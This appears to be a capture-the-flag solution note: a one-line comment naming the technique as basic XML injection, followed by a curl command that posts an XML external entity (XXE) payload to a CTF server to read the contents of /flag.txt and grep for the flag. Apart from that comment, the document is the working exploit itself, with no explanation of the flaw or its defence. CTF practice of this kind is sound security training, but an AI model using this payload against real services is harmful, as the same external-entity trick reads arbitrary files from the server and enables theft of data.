#Basic XML injection , Content-Type: application/xml gave it away , refer hacktricks for explaination
curl -s -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE data [ <!ENTITY external SYSTEM "file:///flag.txt"> ]> <score>&external;</score>' http://skrctf.me:4001/ | grep SKR
